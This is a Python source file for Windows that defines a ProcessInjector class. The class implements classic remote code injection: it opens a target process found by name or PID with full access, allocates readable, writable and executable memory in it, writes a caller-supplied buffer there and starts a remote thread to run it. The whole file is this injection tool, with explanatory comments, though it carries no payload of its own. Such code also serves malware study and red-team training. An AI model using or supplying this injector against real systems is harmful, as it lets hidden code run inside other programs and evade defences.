from sys import exit

from psutil import pids
from psutil import Process as ps

from typing import Union

from winapi_constants import PROCESS_ALL_ACCESS
from winapi_constants import MEM_COMMIT
from winapi_constants import MEM_RESERVE
from winapi_constants import PAGE_EXECUTE_READWRITE

try:
    from ctypes import windll
    from ctypes import c_size_t
    from ctypes import byref
except ImportError:
    print("[-] The `windll` dll could not be imported")
    print("[-] Run this script on a Windows machine with Python3 installed")
    exit(1)

class ProcessInjector:
    def __init__(self, proc: Union[str, int], *, pid=False):
        if not pid:
            if proc.endswith(".exe"):
                self.pid = self._get_process_id(proc)
            else:
                self.pid = self._get_process_id(proc+".exe")
        else:
            self.pid = int(proc)
        self.kern32 = windll.kernel32

    def __enter__(self):
        self.proc_handle = self.kern32.OpenProcess(
            PROCESS_ALL_ACCESS, # Giving all access to the handle we create
            False,              # Subprocess do not inherit this handle
            self.pid)           # PID of target process
        if not self.proc_handle:
            print("[-] Unable to obtain a handle to the target process")
            exit(1)
        else:
            return self

    def __exit__(self, exception_type, exception_value, exeception_traceback):
        self.kern32.CloseHandle(self.proc_handle)
        if exception_type:
            print(exception_value)
            exit(1)
        return False

    def _get_process_id(self, proc: str) -> str:
        return [p for p in pids() if ps(p).name() == proc][0]
    
    def virtual_alloc_ex(self, payload_size: int):
        self.alloc_mem_base_addr = self.kern32.VirtualAllocEx(
            self.proc_handle,       # Process handle
            0,                      # Let function determine where to allocate the memory
            payload_size,           # size of payload
            MEM_COMMIT,             # Commit the region of virtual memory pages we created
            PAGE_EXECUTE_READWRITE) # set read, write, and execute permissions to allocated memory
        if not self.alloc_mem_base_addr:
            raise Exception(f"[-] Could not allocate memory in the target process: {self.pid}")
        else:
            return self.alloc_mem_base_addr

    def write_process_memory(self, lp_buffer, n_size):
        num_bytes_written = c_size_t(0)
        # If the return value of `WriteProcessMemory`
        # is equal to 0, the function failed
        self.kern32.WriteProcessMemory(
            self.proc_handle,         # Process handle
            self.alloc_mem_base_addr, # Base address returned by `VirtualAllocEx`
            lp_buffer,                # The data we want to write into the allocated memory
            n_size,                   # The amount of data from our buffer we wish to write
            num_bytes_written)        # the number of bytes written
    
    def create_remote_thread(self):
        self.kern32.CreateRemoteThread(
            self.proc_handle,         # Process handle
            None,                     # set default security descriptor 
            0,                        # use default size of executable
            self.alloc_mem_base_addr, # Base address returned by `VirtualAllocEx`
            0,                        # ignore lpParamter
            0,                        # run thread immediately after creation
            0)                        # ignore thread identifier
        
